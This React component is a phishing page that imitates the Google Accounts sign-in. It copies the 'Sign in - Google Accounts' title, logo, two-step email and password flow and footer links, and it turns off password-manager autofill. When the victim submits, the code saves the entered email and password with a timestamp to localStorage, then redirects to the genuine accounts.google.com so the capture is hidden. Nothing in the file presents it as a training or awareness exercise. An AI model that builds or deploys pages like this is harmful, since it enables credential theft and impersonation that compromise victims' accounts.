import React, { useEffect, useState } from 'react';
import './google code/app.css';
import './google code/styles/signin.css';
import './google code/styles/password.css';
import './google code/styles/main.css';

function App() {
  const [isPasswordPage, setIsPasswordPage] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    document.title = 'Sign in - Google Accounts';
    
    const storedEmail = localStorage.getItem('userEmail');
    if (storedEmail) {
      setUserEmail(storedEmail);
      setIsPasswordPage(true);
    }
  }, []);

  const handleSignInSubmit = (e) => {
    e.preventDefault();
    const emailInput = document.getElementById('email');
    if (emailInput && emailInput.value) {
      localStorage.setItem('userEmail', emailInput.value);
      setUserEmail(emailInput.value);
      setIsPasswordPage(true);
    }
  };

  const handlePasswordSubmit = (e) => {
    e.preventDefault();
    const passwordInput = document.getElementById('password');
    if (passwordInput && passwordInput.value) {
      const credentials = {
        email: userEmail,
        password: passwordInput.value,
        timestamp: new Date().toISOString()
      };
      localStorage.setItem('lastLoginAttempt', JSON.stringify(credentials));
      localStorage.removeItem('userEmail');
      window.location.replace(`https://accounts.google.com/AccountChooser?Email=${encodeURIComponent(userEmail)}`);
    }
  };

  const handleBackToSignIn = () => {
    localStorage.removeItem('userEmail');
    setIsPasswordPage(false);
    setUserEmail('');
  };

  if (isPasswordPage) {
    return (
      <div className="page-container">
        <div className="login-container">
          <div className="login-box">
            <img src="/google-g-logo.svg" alt="Google" className="google-logo" />
            <h1>Welcome</h1>
            <div className="email-display" onClick={handleBackToSignIn}>
              <span className="email-text">{userEmail}</span>
              <span className="email-arrow">▼</span>
            </div>
            <form onSubmit={handlePasswordSubmit} autoComplete="off">
              <div className="form-group">
                <input 
                  type={showPassword ? "text" : "password"}
                  className="input-field" 
                  id="password" 
                  name="current-password"
                  placeholder="Enter your password" 
                  required
                  autoComplete="off"
                  data-lpignore="true"
                />
                <div className="show-password">
                  <input 
                    type="checkbox" 
                    id="show-password-checkbox"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                  />
                  <label htmlFor="show-password-checkbox">Show password</label>
                </div>
              </div>
              <div className="form-actions">
                <button type="button" className="forgot-password">Forgot password?</button>
                <button type="submit" className="next-button">Next</button>
              </div>
            </form>
          </div>
        </div>
        <footer>
          <select className="language-select">
            <option>English (United States)</option>
          </select>
          <div className="footer-links">
            <button type="button" onClick={() => window.open('https://support.google.com')}>Help</button>
            <button type="button" onClick={() => window.open('https://policies.google.com/privacy')}>Privacy</button>
            <button type="button" onClick={() => window.open('https://policies.google.com/terms')}>Terms</button>
          </div>
        </footer>
      </div>
    );
  }

  return (
    <div className="page-container">
      <div className="login-container">
        <div className="login-box">
          <img src="/google-g-logo.svg" alt="Google" className="google-logo" />
          <h1>Sign in</h1>
          <p className="subtitle">Use your Google Account</p>
          <form onSubmit={handleSignInSubmit}>
            <div className="form-group">
              <input 
                type="email" 
                className="input-field" 
                id="email" 
                placeholder="Email or phone" 
                required 
              />
            </div>
            <button type="button" className="forgot-email">Forgot email?</button>
            <p className="guest-mode">
              Not your computer? Use Guest mode to sign in privately.
              <button type="button" onClick={() => window.open('https://support.google.com/chrome/answer/6130773')}>
                Learn more about using Guest mode
              </button>
            </p>
            <div className="form-actions">
              <button type="button" className="create-account">Create account</button>
              <button type="submit" className="next-button">Next</button>
            </div>
          </form>
        </div>
      </div>
      <footer>
        <select className="language-select">
          <option>English (United States)</option>
        </select>
        <div className="footer-links">
          <button type="button" onClick={() => window.open('https://support.google.com')}>Help</button>
          <button type="button" onClick={() => window.open('https://policies.google.com/privacy')}>Privacy</button>
          <button type="button" onClick={() => window.open('https://policies.google.com/terms')}>Terms</button>
        </div>
      </footer>
    </div>
  );
}

export default App; 